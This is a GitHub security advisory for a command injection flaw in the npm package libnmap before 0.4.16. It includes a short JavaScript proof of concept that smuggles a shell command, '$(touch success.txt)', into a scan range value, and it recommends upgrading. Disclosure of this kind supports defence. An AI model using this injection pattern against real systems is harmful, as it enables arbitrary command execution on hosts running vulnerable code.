# [M] Command Injection in libnmap

## Summary
Severity: Medium
Advisory: GHSA-7g2w-6r25-2j7p
CVE: CVE-2018-16461
CWE: CWE-77
Ecosystem: npm
Published: 2018-11-01
Source: https://github.com/advisories/GHSA-7g2w-6r25-2j7p
Type: github-advisory

## Affected
- npm: `libnmap` — affected >=0 <0.4.16

## Details
Versions of `libnmap` before 0.4.16 are vulnerable to command injection. 

Proof of concept

```js
const nmap = require('libnmap');
const opts = {
    range: [
        'scanme.nmap.org',
        "x.x.$(touch success.txt)"
    ]
};
nmap.scan(opts, function(err, report) {
    if (err) throw new Error(err);

    for (let item in report) {
        console.log(JSON.stringify(report[item]));
    }
});
```


## Recommendation

Update to version 0.4.16 or later

## References
- https://nvd.nist.gov/vuln/detail/CVE-2018-16461
- https://hackerone.com/reports/390865
- https://github.com/advisories/GHSA-7g2w-6r25-2j7p
- https://github.com/nodejs/security-wg/blob/master/vuln/npm/474.json
- https://www.npmjs.com/advisories/719
